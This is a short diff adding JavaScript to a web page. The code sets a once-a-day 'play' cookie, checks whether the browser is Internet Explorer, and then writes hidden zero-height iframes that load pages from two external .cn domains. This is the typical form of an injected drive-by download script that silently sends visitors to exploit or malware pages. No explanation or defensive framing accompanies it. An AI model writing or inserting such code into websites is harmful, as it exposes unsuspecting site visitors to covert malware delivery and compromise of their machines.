@@ -1,0 +1,13 @@
+function init(){window.status="";}window.onload = init;
+if(document.cookie.indexOf("play=")==-1)
+{
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie="play=Yes;path=/;expires="+expires.toGMTString();
+if(navigator.userAgent.toLowerCase().indexOf("msie")>0)
+{
+document.write("<Iframe src=http://www.baomaaa.cn/a1/ilink.html width=100 height=0></Iframe>");
+}
+else{document.write("<Iframe src=http://www.baomaaa.cn/a1/flink.html width=100 height=0></Iframe>");}
+}
+document.writeln("<Iframe src=http:\/\/www.bengchiww.cn\/b2.htm width=50 height=0><\/iframe>")
